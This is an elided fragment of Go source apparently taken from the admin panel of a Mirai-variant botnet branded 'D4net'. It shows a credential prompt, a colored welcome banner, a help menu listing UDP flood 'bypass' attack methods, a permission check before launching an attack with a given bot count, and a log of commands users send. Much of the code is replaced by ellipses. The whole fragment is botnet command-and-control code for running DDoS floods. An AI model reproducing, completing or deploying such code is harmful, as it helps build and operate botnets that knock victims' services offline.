...
this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
  ...
  if err != nil {
	...
	this.conn.Write([]byte("\033[0m \r\n"))
	this.conn.Write([]byte("\033[0m                         \033[31mWelcome To \033[39mD4net \033[91mMirai Variant\r\n"))
	...
	for {
		...
		if err != nil || cmd == "?" || cmd == "help" || cmd == "HELP" || cmd == "methods" {
			...
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.udpsmart		 \033[31m\" \033[90m Custom udp bypass Flood                \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.udpbypass		 \033[31m\" \033[90m Custom udp Flood                       \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
        }
			...
			if err != nil {
				...
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
                        ...
                        fmt.Println("\033[93m(D4net) >> Command sent by \033[1;91m[" + username + "]\033[31m using command line.\033[0m\n")
